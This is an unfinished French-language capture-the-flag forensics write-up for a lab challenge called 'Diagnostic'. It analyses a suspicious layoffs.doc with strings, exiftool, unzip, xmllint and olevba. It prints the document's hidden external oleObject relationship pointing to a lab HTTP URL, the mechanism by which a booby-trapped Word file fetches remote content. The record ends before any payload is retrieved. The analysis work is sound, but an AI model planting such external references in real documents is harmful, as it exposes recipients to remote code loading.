\section{[TO FINISH] Diagnostic}

\begin{verbatim}
$ curl -O http://139.59.161.137:32559/layoffs.doc
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10707  100 10707    0     0   163k      0 --:--:-- --:--:-- --:--:--  165k
$ strings layoffs.doc
_rels/PK
docProps/PK
.. .SNIP. ..
\end{verbatim}

rien avec strings

\begin{verbatim}
$ exiftool layoffs.doc
ExifTool Version Number         : 12.50
File Name                       : layoffs.doc
Directory                       : .
File Size                       : 11 kB
File Modification Date/Time     : 2022:12:19 13:25:34+01:00
File Access Date/Time           : 2022:12:19 13:25:50+01:00
File Inode Change Date/Time     : 2022:12:19 13:25:41+01:00
File Permissions                : -rw-r-----
Warning                         : Install Archive::Zip to decode compressed ZIP information
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0
Zip Compression                 : None
Zip Modify Date                 : 2022:06:01 11:19:18
Zip CRC                         : 0x00000000
Zip Compressed Size             : 0
Zip Uncompressed Size           : 0
Zip File Name                   : _rels/

$ file layoffs.doc
layoffs.doc: Zip archive data, at least v2.0 to extract, compression method=store


$ cp layoffs.doc layoffs.zip
$ unzip layoffs.zip
Archive:  layoffs.zip
   creating: _rels/
   creating: docProps/
   creating: word/
  inflating: [Content_Types].xml
   creating: word/_rels/
   creating: word/theme/
  inflating: word/styles.xml
  inflating: word/document.xml
  inflating: word/fontTable.xml
  inflating: word/settings.xml
  inflating: word/webSettings.xml
  inflating: word/theme/theme1.xml
  inflating: word/_rels/document.xml.rels
  inflating: _rels/.rels
  inflating: docProps/app.xml
  inflating: docProps/core.xml


$ xmllint --format XML_FILE \[Content_Types\].xml
warning: failed to load external entity "XML_FILE"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>
  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
  <Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/>
  <Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/>
  <Override PartName="/word/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
</Types>
\end{verbatim}


bon en recherchant la chaine faisant référence au serveur on la trouve
visiblement que dans un seul fichier
\begin{verbatim}
$ grep diagnostic */*/*
word/_rels/document.xml.rels:    <Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:32559/223_index_style_fancy.html!" TargetMode="External"/>


$ xmllint --format XML_FILE _rels/*
warning: failed to load external entity "XML_FILE"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:32559/223_index_style_fancy.html!" TargetMode="External"/>
  <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/>
</Relationships>
\end{verbatim}

donc:
\begin{verbatim}
<Relationship 
    Id="rId996" 
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" 
    Target="http://diagnostic.htb:32559/223_index_style_fancy.html!" 
    TargetMode="External"/>
\end{verbatim}

un curl sur l'url ne fini pas et je ne vois pas d'autre solution.


\begin{verbatim}
$ olevba -c layoffs.doc
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.8 - http://decalage.info/python/oletools
===============================================================================
FILE: layoffs.doc
Type: OpenXML
No VBA or XLM macros found
\end{verbatim}
